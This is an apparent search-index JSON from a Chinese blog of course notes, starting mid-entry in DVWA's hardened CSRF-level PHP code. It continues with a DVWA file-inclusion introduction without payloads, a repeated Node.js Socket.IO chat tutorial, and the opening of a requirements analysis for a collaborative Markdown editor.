current password is correct $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR ); $data->execute(); // Do both new passwords match and does the current password match the user? if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) { // It does! $pass_new = stripslashes( $pass_new ); $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update database with new password $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' ); $data->bindParam( ':password', $pass_new, PDO::PARAM_STR ); $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); $data->execute(); // Feedback for the user echo \"<pre>Password Changed.</pre>\"; } else { // Issue with passwords matching echo \"<pre>Passwords did not match or current password incorrect.</pre>\"; } } // Generate Anti-CSRF token generateSessionToken(); ?> \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.3. Impossible"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/5.DVWA_File_Inclusion_All/","text":"DVWA File Inclusion All # \u76ee\u5f55 # DVWA File Inclusion All \u76ee\u5f55 1. \u80cc\u666f 2. \u73af\u5883\u642d\u5efa 1. \u80cc\u666f # \u6700\u8fd1\u9700\u8981\u8865\u5145\u4e00\u4e0b\u7f51\u7edc\u5b89\u5168\u65b9\u9762\u7684\u77e5\u8bc6\uff0c\u4e8e\u662f\u5c31\u4ece\u57fa\u7840\u7684\u9776\u573a DVWA (Damn Vulnerable Web Application) \u5f00\u59cb\u5237\u8d77\uff0c\u8fd9\u4e00\u7bc7\u662f\u5173\u4e8e\u4ece Low \u5230 High \u96be\u5ea6\u7684 \u6587\u4ef6\u5305\u542b\u653b\u51fb \u7684\u5185\u5bb9\u3002 \u548c\u6211\u4e00\u6837\u5e0c\u671b\u5b66\u4e60\u7f51\u7edc\u5b89\u5168\u77e5\u8bc6\u7684\u540c\u5b66\uff0c\u63a8\u8350\u5b66\u4e60 \u300aWeb\u5b89\u5168\u653b\u9632\u5b9e\u6218\u300b \u548c \u300a\u5b89\u5168\u653b\u9632\u6280\u80fd30\u8bb2\u300b \u3002 2. \u73af\u5883\u642d\u5efa # \u53c2\u8003\u4e0a\u4e00\u7bc7 \u5173\u4e8e Brute Force \u66b4\u529b\u7834\u89e3\u5bc6\u7801\u7684\u535a\u5ba2 \u3002","title":"5.DVWA File Inclusion All"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/5.DVWA_File_Inclusion_All/#dvwa-file-inclusion-all","text":"","title":"DVWA File Inclusion All"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/5.DVWA_File_Inclusion_All/#_1","text":"DVWA File Inclusion All \u76ee\u5f55 1. \u80cc\u666f 2. \u73af\u5883\u642d\u5efa","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/5.DVWA_File_Inclusion_All/#1","text":"\u6700\u8fd1\u9700\u8981\u8865\u5145\u4e00\u4e0b\u7f51\u7edc\u5b89\u5168\u65b9\u9762\u7684\u77e5\u8bc6\uff0c\u4e8e\u662f\u5c31\u4ece\u57fa\u7840\u7684\u9776\u573a DVWA (Damn Vulnerable Web Application) \u5f00\u59cb\u5237\u8d77\uff0c\u8fd9\u4e00\u7bc7\u662f\u5173\u4e8e\u4ece Low \u5230 High \u96be\u5ea6\u7684 \u6587\u4ef6\u5305\u542b\u653b\u51fb \u7684\u5185\u5bb9\u3002 \u548c\u6211\u4e00\u6837\u5e0c\u671b\u5b66\u4e60\u7f51\u7edc\u5b89\u5168\u77e5\u8bc6\u7684\u540c\u5b66\uff0c\u63a8\u8350\u5b66\u4e60 \u300aWeb\u5b89\u5168\u653b\u9632\u5b9e\u6218\u300b \u548c \u300a\u5b89\u5168\u653b\u9632\u6280\u80fd30\u8bb2\u300b \u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/DVWA%E8%AE%AD%E7%BB%83/5.DVWA_File_Inclusion_All/#2","text":"\u53c2\u8003\u4e0a\u4e00\u7bc7 \u5173\u4e8e Brute Force \u66b4\u529b\u7834\u89e3\u5bc6\u7801\u7684\u535a\u5ba2 \u3002","title":"2. \u73af\u5883\u642d\u5efa"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/1.%E4%BD%BF%E7%94%A8Node.js%E6%90%AD%E5%BB%BA%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/","text":"\u4f7f\u7528 Node.js \u642d\u5efa\u804a\u5929\u7cfb\u7edf # \u76ee\u5f55 # \u4f7f\u7528 Node.js \u642d\u5efa\u804a\u5929\u7cfb\u7edf \u76ee\u5f55 1. \u80cc\u666f 2. \u524d\u671f\u51c6\u5907 2.1. \u5b89\u88c5Node.js 2.2. \u5b89\u88c5Express\u548cSocket.IO 2.3. \u670d\u52a1\u7aef 2.4. \u5ba2\u6237\u7aef 3. \u6d4b\u8bd5\u6548\u679c 1. \u80cc\u666f # \u8fd9\u5b66\u671f\u9009\u4e86\u4e00\u95e8\u77ed\u5b66\u671f\u8bfe\u7a0b\uff0c\u300a\u8ba1\u7b97\u673a\u4e13\u4e1a\u8bfe\u7a0b\u8bbe\u8ba1\u300b\uff0c\u6211\u4eec\u9700\u8981\u5355\u72ec\u5b8c\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u9879\u76ee\u5e76\u6c47\u62a5\u7ed9\u8001\u5e08\u3002\u6211\u51c6\u5907\u501f\u9274 CodiMD \u6765\u5b9e\u73b0\u4e00\u4e2a\u57fa\u4e8e Node.js \u7684 MarkDown \u6587\u6863\u534f\u540c\u7f16\u8f91\u5e73\u53f0\u3002 \u5728\u6211\u6d4f\u89c8CodiMD\u7684\u6e90\u7801\u65f6\uff0c\u53d1\u73b0\u9879\u76ee\u4e2d\u5b9e\u73b0\u5b9e\u65f6\u534f\u540c\u7f16\u8f91\u7684\u4e00\u4e2a\u5173\u952e\u6a21\u5757\u662f Socket.IO \uff0c\u4e8e\u662f\u5148\u4ece\u5b83\u5f00\u59cb\u5b66\u8d77\uff0c\u8fd9\u7bc7\u535a\u5ba2\u662f Socket.IO \u7684\u4e00\u4e2a\u5165\u95e8\u9879\u76ee\uff0c\u57fa\u4e8e Node.js \u7684\u804a\u5929\u7cfb\u7edf\u3002 2. \u524d\u671f\u51c6\u5907 # 2.1. \u5b89\u88c5Node.js # \u524d\u5f80\u5b98\u7f51 https://nodejs.org/en/download/ \u8fdb\u884c\u4e0b\u8f7d\uff0c\u56fe\u5f62\u754c\u9762\u5b89\u88c5\uff0c\u6309\u7167\u63d0\u793a\u8fdb\u884c\u5373\u53ef Mac OS\u4e5f\u53ef\u4ee5\u7528brew\u5b89\u88c5 brew install node 2.2. \u5b89\u88c5Express\u548c Socket.IO # \u5148\u521b\u5efa\u9879\u76ee\u6587\u4ef6\u5939\uff0c\u5c06\u5b83\u547d\u540d\u4e3a myapp \u3002 mkdir myapp cd myapp \u7136\u540e\u5b89\u88c5\u5e93\u6587\u4ef6\u3002 npm install express socket.io --save 2.3. \u670d\u52a1\u7aef # \u521b\u5efa index.js \u3002\u83b7\u53d6\u67d0\u4e00\u5ba2\u6237\u7aef\u4f20\u5165\u7684\u804a\u5929\u6d88\u606f\uff0c\u5e76\u8fd4\u56de\u7ed9\u6240\u6709\u5ba2\u6237\u7aef\u3002 // index.js // \u83b7\u53d6Express\u5e76\u521b\u5efa\u670d\u52a1 var app = require('express')(); // \u83b7\u53d6http\u6a21\u5757 var http = require('http').Server(app); // \u83b7\u53d6socket.io\u6a21\u5757 var io = require('socket.io')(http); // \u8bbe\u7f6e\u76d1\u542c\u7aef\u53e3\u4e3a\u8fdb\u7a0b\u7aef\u53e3\u62163000\u7aef\u53e3 var port = process.env.PORT || 3000; // \u8bf7\u6c42\u6839\u8def\u5f84\u65f6\uff0c\u8fd4\u56deindex.html app.get('/', function(req, res){ res.sendFile(__dirname + '/index.html'); }); // \u5efa\u7acb\u65b0\u7684 TCP \u6d41\u65f6\u4f1a\u89e6\u53d1connection\u4e8b\u4ef6\uff0c\u6267\u884c\u56de\u8c03\u51fd\u6570 io.on('connection', function(socket){ // \u83b7\u53d6\u4f20\u5165\u7684'chat message'\u4fe1\u606f socket.on('chat message', function(msg){ // \u5c06'chat message'\u5411\u6240\u6709\u5ba2\u6237\u7aef\u8fdb\u884c\u5e7f\u64ad io.emit('chat message', msg); }); }); // \u76d1\u542c\u7aef\u53e3 http.listen(port, function(){ console.log('listening on *:' + port); }); 2.4. \u5ba2\u6237\u7aef # \u521b\u5efa index.html \uff0c\u5411\u670d\u52a1\u7aef\u53d1\u9001\u804a\u5929\u6d88\u606f\uff0c\u5e76\u5c06\u670d\u52a1\u7aef\u8fd4\u56de\u7684\u6d88\u606f\u663e\u793a\u5728\u754c\u9762\u4e2d\u3002 <!doctype html> <html> <head> <title>Socket.IO chat</title> <!-- css\u6837\u5f0f\u6587\u4ef6 --> <style> * { margin: 0; padding: 0; box-sizing: border-box; } body { font: 13px Helvetica, Arial; } form { background: #000; padding: 3px; position: fixed; bottom: 0; width: 100%; } form input { border: 0; padding: 10px; width: 90%; margin-right: .5%; } form button { width: 9%; background: rgb(130, 224, 255); border: none; padding: 10px; } #messages { list-style-type: none; margin: 0; padding: 0; } #messages li { padding: 5px 10px; } #messages li:nth-child(odd) { background: #eee; } #messages { margin-bottom: 40px } </style> </head> <body> <ul id=\"messages\"></ul> <form action=\"\"> <input id=\"m\" autocomplete=\"off\" /><button>Send</button> </form> <!-- \u52a0\u8f7dsocket.io\u548cjquery --> <script src=\"https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.0/socket.io.js\"></script> <script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js\"></script> <script> $(function () { var socket = io(); // \u7528\u6237\u70b9\u51fbSend\u89e6\u53d1Submit\u4e8b\u4ef6 $('form').submit(function () { // \u5411\u670d\u52a1\u7aef\u53d1\u9001\u6587\u672c\u6846\u4e2d\u7684\u5185\u5bb9 socket.emit('chat message', $('#m').val()); // \u6e05\u7a7a\u6587\u672c\u6846 $('#m').val(''); return false; }); // \u63a5\u53d7\u5230\u670d\u52a1\u7aef\u53d1\u9001\u7684'chat message'\u65f6 socket.on('chat message', function (msg) { // \u5c06\u63a5\u53d7\u5230\u7684\u6d88\u606f\u663e\u793a\u5728\u6d88\u606f\u754c\u9762 $('#messages').append($('<li>').text(msg)); // \u5c4f\u5e55\u5411\u4e0b\u6eda\u52a8 window.scrollTo(0, document.body.scrollHeight); }); }); </script> </body> </html> 3. \u6d4b\u8bd5\u6548\u679c # \u5b8c\u6210\u4e0a\u8ff0\u6b65\u9aa4\uff0c\u76ee\u5f55\u6811\u5e94\u8be5\u662f\u8fd9\u6837\u7684\u3002 xxx/myapp \u251c\u2500\u2500 index.html \u251c\u2500\u2500 index.js \u251c\u2500\u2500 node_modules \u251c\u2500\u2500 package-lock.json \u2514\u2500\u2500 package.json \u5728myapp\u6587\u4ef6\u5939\u4e0b\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u3002 node index.js \u5f53\u547d\u4ee4\u884c\u663e\u793a listening on *:3000 \uff0c\u5c31\u6210\u529f\u8fd0\u884c\u4e86\u3002 \u63a5\u4e0b\u6765\u5206\u522b\u6253\u5f00\u4e24\u4e2a\u6d4f\u89c8\u5668\uff0c\u5728\u804a\u5929\u7a97\u53e3\u4e2d\u8fdb\u884c\u5bf9\u8bdd\u3002 \\text{Figure 1. Safari} \\text{Figure 2. Chrome} \u6d4b\u8bd5\u6210\u529f\u3002 \u9879\u76ee\u7684\u5b8c\u6574\u4ee3\u7801\u53ef\u4ee5\u53c2\u8003 Github \u3002 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u4f7f\u7528Node.js\u642d\u5efa\u804a\u5929\u7cfb\u7edf"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/1.%E4%BD%BF%E7%94%A8Node.js%E6%90%AD%E5%BB%BA%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/#nodejs","text":"","title":"\u4f7f\u7528 Node.js \u642d\u5efa\u804a\u5929\u7cfb\u7edf"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/1.%E4%BD%BF%E7%94%A8Node.js%E6%90%AD%E5%BB%BA%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/#_1","text":"\u4f7f\u7528 Node.js \u642d\u5efa\u804a\u5929\u7cfb\u7edf \u76ee\u5f55 1. \u80cc\u666f 2. \u524d\u671f\u51c6\u5907 2.1. \u5b89\u88c5Node.js 2.2. \u5b89\u88c5Express\u548cSocket.IO 2.3. \u670d\u52a1\u7aef 2.4. \u5ba2\u6237\u7aef 3. \u6d4b\u8bd5\u6548\u679c","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/1.%E4%BD%BF%E7%94%A8Node.js%E6%90%AD%E5%BB%BA%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/#1","text":"\u8fd9\u5b66\u671f\u9009\u4e86\u4e00\u95e8\u77ed\u5b66\u671f\u8bfe\u7a0b\uff0c\u300a\u8ba1\u7b97\u673a\u4e13\u4e1a\u8bfe\u7a0b\u8bbe\u8ba1\u300b\uff0c\u6211\u4eec\u9700\u8981\u5355\u72ec\u5b8c\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u9879\u76ee\u5e76\u6c47\u62a5\u7ed9\u8001\u5e08\u3002\u6211\u51c6\u5907\u501f\u9274 CodiMD \u6765\u5b9e\u73b0\u4e00\u4e2a\u57fa\u4e8e Node.js \u7684 MarkDown \u6587\u6863\u534f\u540c\u7f16\u8f91\u5e73\u53f0\u3002 \u5728\u6211\u6d4f\u89c8CodiMD\u7684\u6e90\u7801\u65f6\uff0c\u53d1\u73b0\u9879\u76ee\u4e2d\u5b9e\u73b0\u5b9e\u65f6\u534f\u540c\u7f16\u8f91\u7684\u4e00\u4e2a\u5173\u952e\u6a21\u5757\u662f Socket.IO \uff0c\u4e8e\u662f\u5148\u4ece\u5b83\u5f00\u59cb\u5b66\u8d77\uff0c\u8fd9\u7bc7\u535a\u5ba2\u662f Socket.IO \u7684\u4e00\u4e2a\u5165\u95e8\u9879\u76ee\uff0c\u57fa\u4e8e Node.js \u7684\u804a\u5929\u7cfb\u7edf\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/1.%E4%BD%BF%E7%94%A8Node.js%E6%90%AD%E5%BB%BA%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/#2","text":"","title":"2. \u524d\u671f\u51c6\u5907"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/1.%E4%BD%BF%E7%94%A8Node.js%E6%90%AD%E5%BB%BA%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/#21-nodejs","text":"\u524d\u5f80\u5b98\u7f51 https://nodejs.org/en/download/ \u8fdb\u884c\u4e0b\u8f7d\uff0c\u56fe\u5f62\u754c\u9762\u5b89\u88c5\uff0c\u6309\u7167\u63d0\u793a\u8fdb\u884c\u5373\u53ef Mac OS\u4e5f\u53ef\u4ee5\u7528brew\u5b89\u88c5 brew install node","title":"2.1. \u5b89\u88c5Node.js"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/1.%E4%BD%BF%E7%94%A8Node.js%E6%90%AD%E5%BB%BA%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/#22-expresssocketio","text":"\u5148\u521b\u5efa\u9879\u76ee\u6587\u4ef6\u5939\uff0c\u5c06\u5b83\u547d\u540d\u4e3a myapp \u3002 mkdir myapp cd myapp \u7136\u540e\u5b89\u88c5\u5e93\u6587\u4ef6\u3002 npm install express socket.io --save","title":"2.2. \u5b89\u88c5Express\u548cSocket.IO"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/1.%E4%BD%BF%E7%94%A8Node.js%E6%90%AD%E5%BB%BA%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/#23","text":"\u521b\u5efa index.js \u3002\u83b7\u53d6\u67d0\u4e00\u5ba2\u6237\u7aef\u4f20\u5165\u7684\u804a\u5929\u6d88\u606f\uff0c\u5e76\u8fd4\u56de\u7ed9\u6240\u6709\u5ba2\u6237\u7aef\u3002 // index.js // \u83b7\u53d6Express\u5e76\u521b\u5efa\u670d\u52a1 var app = require('express')(); // \u83b7\u53d6http\u6a21\u5757 var http = require('http').Server(app); // \u83b7\u53d6socket.io\u6a21\u5757 var io = require('socket.io')(http); // \u8bbe\u7f6e\u76d1\u542c\u7aef\u53e3\u4e3a\u8fdb\u7a0b\u7aef\u53e3\u62163000\u7aef\u53e3 var port = process.env.PORT || 3000; // \u8bf7\u6c42\u6839\u8def\u5f84\u65f6\uff0c\u8fd4\u56deindex.html app.get('/', function(req, res){ res.sendFile(__dirname + '/index.html'); }); // \u5efa\u7acb\u65b0\u7684 TCP \u6d41\u65f6\u4f1a\u89e6\u53d1connection\u4e8b\u4ef6\uff0c\u6267\u884c\u56de\u8c03\u51fd\u6570 io.on('connection', function(socket){ // \u83b7\u53d6\u4f20\u5165\u7684'chat message'\u4fe1\u606f socket.on('chat message', function(msg){ // \u5c06'chat message'\u5411\u6240\u6709\u5ba2\u6237\u7aef\u8fdb\u884c\u5e7f\u64ad io.emit('chat message', msg); }); }); // \u76d1\u542c\u7aef\u53e3 http.listen(port, function(){ console.log('listening on *:' + port); });","title":"2.3. \u670d\u52a1\u7aef"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/1.%E4%BD%BF%E7%94%A8Node.js%E6%90%AD%E5%BB%BA%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/#24","text":"\u521b\u5efa index.html \uff0c\u5411\u670d\u52a1\u7aef\u53d1\u9001\u804a\u5929\u6d88\u606f\uff0c\u5e76\u5c06\u670d\u52a1\u7aef\u8fd4\u56de\u7684\u6d88\u606f\u663e\u793a\u5728\u754c\u9762\u4e2d\u3002 <!doctype html> <html> <head> <title>Socket.IO chat</title> <!-- css\u6837\u5f0f\u6587\u4ef6 --> <style> * { margin: 0; padding: 0; box-sizing: border-box; } body { font: 13px Helvetica, Arial; } form { background: #000; padding: 3px; position: fixed; bottom: 0; width: 100%; } form input { border: 0; padding: 10px; width: 90%; margin-right: .5%; } form button { width: 9%; background: rgb(130, 224, 255); border: none; padding: 10px; } #messages { list-style-type: none; margin: 0; padding: 0; } #messages li { padding: 5px 10px; } #messages li:nth-child(odd) { background: #eee; } #messages { margin-bottom: 40px } </style> </head> <body> <ul id=\"messages\"></ul> <form action=\"\"> <input id=\"m\" autocomplete=\"off\" /><button>Send</button> </form> <!-- \u52a0\u8f7dsocket.io\u548cjquery --> <script src=\"https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.0/socket.io.js\"></script> <script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js\"></script> <script> $(function () { var socket = io(); // \u7528\u6237\u70b9\u51fbSend\u89e6\u53d1Submit\u4e8b\u4ef6 $('form').submit(function () { // \u5411\u670d\u52a1\u7aef\u53d1\u9001\u6587\u672c\u6846\u4e2d\u7684\u5185\u5bb9 socket.emit('chat message', $('#m').val()); // \u6e05\u7a7a\u6587\u672c\u6846 $('#m').val(''); return false; }); // \u63a5\u53d7\u5230\u670d\u52a1\u7aef\u53d1\u9001\u7684'chat message'\u65f6 socket.on('chat message', function (msg) { // \u5c06\u63a5\u53d7\u5230\u7684\u6d88\u606f\u663e\u793a\u5728\u6d88\u606f\u754c\u9762 $('#messages').append($('<li>').text(msg)); // \u5c4f\u5e55\u5411\u4e0b\u6eda\u52a8 window.scrollTo(0, document.body.scrollHeight); }); }); </script> </body> </html>","title":"2.4. \u5ba2\u6237\u7aef"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/1.%E4%BD%BF%E7%94%A8Node.js%E6%90%AD%E5%BB%BA%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/#3","text":"\u5b8c\u6210\u4e0a\u8ff0\u6b65\u9aa4\uff0c\u76ee\u5f55\u6811\u5e94\u8be5\u662f\u8fd9\u6837\u7684\u3002 xxx/myapp \u251c\u2500\u2500 index.html \u251c\u2500\u2500 index.js \u251c\u2500\u2500 node_modules \u251c\u2500\u2500 package-lock.json \u2514\u2500\u2500 package.json \u5728myapp\u6587\u4ef6\u5939\u4e0b\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u3002 node index.js \u5f53\u547d\u4ee4\u884c\u663e\u793a listening on *:3000 \uff0c\u5c31\u6210\u529f\u8fd0\u884c\u4e86\u3002 \u63a5\u4e0b\u6765\u5206\u522b\u6253\u5f00\u4e24\u4e2a\u6d4f\u89c8\u5668\uff0c\u5728\u804a\u5929\u7a97\u53e3\u4e2d\u8fdb\u884c\u5bf9\u8bdd\u3002 \\text{Figure 1. Safari} \\text{Figure 2. Chrome} \u6d4b\u8bd5\u6210\u529f\u3002 \u9879\u76ee\u7684\u5b8c\u6574\u4ee3\u7801\u53ef\u4ee5\u53c2\u8003 Github \u3002 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u6d4b\u8bd5\u6548\u679c"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/2.%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90/","text":"CuMd \u6587\u6863\u534f\u540c\u7f16\u8f91\u5e73\u53f0\u9700\u6c42\u5206\u6790 # \u76ee\u5f55 # CuMd \u6587\u6863\u534f\u540c\u7f16\u8f91\u5e73\u53f0\u9700\u6c42\u5206\u6790 \u76ee\u5f55 1. \u80cc\u666f 2. \u9700\u6c42\u63cf\u8ff0 2.1. \u9879\u76ee\u63cf\u8ff0 2.2. \u57fa\u672c\u9700\u6c42 2.3. \u62d3\u5c55\u9700\u6c42 3. \u7cfb\u7edf\u529f\u80fd\u6a21\u5757\u56fe 4. ER \u56fe 1. \u80cc\u666f # \u8fd9\u5b66\u671f\u9009\u4e86\u4e00\u95e8\u77ed\u5b66\u671f\u8bfe\u7a0b\uff0c\u300a\u8ba1\u7b97\u673a\u4e13\u4e1a\u8bfe\u7a0b\u8bbe\u8ba1\u300b\uff0c\u6211\u4eec\u9700\u8981\u5355\u72ec\u5b8c\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u9879\u76ee\u5e76\u6c47\u62a5\u7ed9\u8001\u5e08\u3002\u6211\u51c6\u5907\u501f\u9274 CodiMD \u6765\u5b9e\u73b0\u4e00\u4e2a\u57fa\u4e8e Node.js \u7684 MarkDown \u6587\u6863\u534f\u540c\u7f16\u8f91\u5e73\u53f0\u3002 \u8fd9\u7bc7\u7b14\u8bb0\u662f\u9879\u76ee\u7684\u9700\u6c42\u5206\u6790\u6587\u6863\u3002 2. \u9700\u6c42\u63cf\u8ff0 # 2.1. \u9879\u76ee\u63cf\u8ff0 # \u5728\u8f6f\u4ef6\u8bbe\u8ba1\u3001\u9700\u6c42\u5206\u6790\u3001\u8f6f\u4ef6\u8bbe\u8ba1\u7684\u62a5\u544a\u64b0\u5199\u4e0e\u4fee\u6539\u4e2d\uff0c\u5e38\u9700\u8981\u591a\u4e2a\u540c\u5b66\u5728\u540c\u4e00\u4e2a\u6587\u6863\u4e0a\u8fdb\u884c\u64b0\u5199\u3001\u4fee\u6539\u3001\u5b8c\u5584\u3002\u7136\u540e\u628a\u5404\u540c\u5b66\u5bf9\u540c\u4e00\u4e2a\u6587\u6863\u7684\u4fee\u6539\u5408\u6210\u4e00\u4e2a\u6587\u6863\u3002\u672c\u9879\u76ee\u8981\u6c42\u8bbe\u8ba1\u4e00\u4e2a\u6587\u6863\u534f\u540c\u7f16\u8f91\u7cfb\u7edf 2.2. \u57fa\u672c\u9700\u6c42 # \u62a5\u544a\u7684\u521d\u59cb\u5212\u5206 \u6bcf\u4e2a\u540c\u5b66\u64b0\u5199\u67d0\u4e2a\u62a5\u544a\u4e2d\u7684\u4e00\u90e8\u5206\uff0c\u64b0\u5199\u62a5\u544a\u7247\u6bb5\uff0c\u7136\u540e\u63d0\u4ea4\u62a5\u544a\u7247\u6bb5 \u62a5\u544a\u7684\u6574\u5408 \u7cfb\u7edf\u63d0\u4f9b\u6574\u5408\u6309\u94ae\uff0c\u628a\u6bcf\u4e2a\u540c\u5b66\u63d0\u4ea4\u7684\u62a5\u544a\u6574\u5408\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u62a5\u544a\u3002 \u4fee\u6539\u8001\u62a5\u544a 